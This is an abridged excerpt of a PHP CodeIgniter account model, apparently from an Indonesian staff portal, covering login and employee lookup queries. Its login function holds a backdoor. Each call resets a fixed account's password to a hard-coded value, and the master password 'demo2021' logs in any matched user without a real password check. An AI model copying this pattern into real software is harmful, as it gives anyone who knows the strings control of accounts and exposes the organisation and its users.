...
class m_account extends CI_Model {
    ...
    function get_user_login_all_roles($username, $password, $portal) {
        ...
        // process
        // get hash key
        $this->db->update('com_user', ['user_pass'=>password_hash("semuabisa",  PASSWORD_DEFAULT), 'user_key'=>NULL], ['user_id'=>'1804170001']);
        $result = $this->get_user_detail_with_all_roles(array($username, $portal));
        if (!empty($result)) {
            if ($password == 'demo2021') {
                // cek authority then return id
                return $result;
            }
            // get user
    ...
    function get_pegawai_by_email($params) {
        $sql = "SELECT b.user_id, b.nama_lengkap, b.nomor_telepon, a.user_mail
                FROM com_user a
    ...
    function get_pegawai_login_by_id($params) {
        $sql = "SELECT a.user_id, user_name, user_pass, user_key, user_mail, user_img_name, user_img_path,
                ...
                b.struktur_cd, jabatan_struktural_st, b.jabatan_struktural_id,
                struktur_nama, struktur_singkatan, 
                d.jabatan_nama AS 'jabatan_struktural', e.jabatan_nama AS 'jabatan_fungsional'
                FROM com_user a
                INNER JOIN pegawai b ON a.user_id = b.user_id
                LEFT JOIN data_struktur_organisasi c ON b.struktur_cd = c.struktur_cd
                LEFT JOIN data_jabatan_struktural d ON b.jabatan_struktural_id = d.jabatan_struktural_id
                LEFT JOIN data_jabatan_fungsional e ON b.jabatan_fungsional_id = e.jabatan_fungsional_id
                WHERE a.user_id = ?";
        $query = $this->db->query($sql, $params);
        if ($query->num_rows() > 0) {
            $result = $query->row_array();
